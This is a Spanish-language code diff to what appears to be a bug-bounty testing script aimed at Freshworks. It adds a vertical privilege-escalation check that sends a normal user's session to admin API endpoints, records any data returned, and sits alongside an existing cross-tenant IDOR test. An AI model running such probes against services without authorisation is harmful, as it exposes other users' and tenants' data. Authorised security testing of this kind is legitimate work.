@@ -188,10 +188,45 @@ def test_cross_tenant_idor(sess_atacante, tenant_a_url, ids_victima, tenant_b_ur
     return hallazgos
 
 
+def test_vertical_escalation(sess_atacante, tenant_a_url):
+    sep("TEST DE ESCALADA VERTICAL (ATACANTE → ADMIN)")
+    print(f"  Atacante (Usuario normal): {tenant_a_url}")
+    
+    endpoints_admin = [
+        "/api/v2/settings",
+        "/api/v2/account",
+        "/api/v2/billing",
+        "/api/v2/webhooks",
+        "/api/v2/automations"
+    ]
+    
+    hallazgos = []
+    
+    for ep in endpoints_admin:
+        try:
+            url = f"{tenant_a_url}{ep}"
+            r = sess_atacante.get(url)
+            if r.status_code == 200:
+                print(f"  🚨🚨 ESCALADA CONFIRMADA [{ep}]: 200 OK — ¡Acceso a recursos de admin!")
+                hallazgos.append({"tipo": "Escalada de Privilegios", "url": url, "data": r.json()})
+            elif r.status_code in [401, 403]:
+                print(f"  ✅ [{ep}]: Bloqueado correctamente ({r.status_code})")
+            elif r.status_code == 404:
+                print(f"  ❓ [{ep}]: 404 (Puede que no exista o esté oculto)")
+                print(f"COLA DE ESPERA: Investigar endpoint {ep} — devolvió 404, posible WAF o ruta cambiada.")
+            else:
+                print(f"  ⚠️ [{ep}]: HTTP {r.status_code}")
+                print(f"COLA DE ESPERA: Comportamiento anómalo en {ep} — HTTP {r.status_code}")
+        except Exception as e:
+            print(f"  [{ep}]: ERROR {e}")
+            
+    return hallazgos
+
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument("--mapeo-solo", action="store_true", help="Ejecutar solo el paso 1 de la cascada (mapear IDs)")
-    parser.add_argument("--ataque-solo", action="store_true", help="Ejecutar el paso 2 de la cascada (cross-tenant attack)")
+    parser.add_argument("--mapeo-solo", action="store_true")
+    parser.add_argument("--ataque-solo", action="store_true")
+    parser.add_argument("--escalada-solo", action="store_true")
     args = parser.parse_args()
 
     print("=" * 60)
@@ -230,9 +265,16 @@ def main():
     if args.mapeo_solo:
         print("\n✅ MAPEO COMPLETADO CON ÉXITO. Puede avanzar al paso 2 de ataque.")
         sys.exit(0)
+        
+    if args.escalada_solo:
+        hallazgos_escalada = test_vertical_escalation(sess_a, TENANT_A_URL)
+        if hallazgos_escalada:
+            print("\n  🚨🚨🚨 ESCALADA CONFIRMADA — Preparar reporte para HackerOne")
+        else:
+            print("\n  ✅ Sin Escalada detectada en este vector.")
+        sys.exit(0)
 
     # Si llega acá, es un test completo o un --ataque-solo
-    # TEST PRINCIPAL: Atacante intenta acceder a IDs de la víctima
     hallazgos = test_cross_tenant_idor(sess_a, TENANT_A_URL, ids_victima, TENANT_B_URL)
 
     sep("CONCLUSIÓN")
@@ -241,7 +283,7 @@ def main():
         print("  Los datos de arriba son la evidencia del bug.")
     else:
         print("  ✅ Sin IDOR detectado en este vector.")
-        print("  Próximo paso: probar otros endpoints o productos Freshworks.")
+        print("  Próximo paso: probar Escalada Vertical.")
     print("=" * 60)
 
 
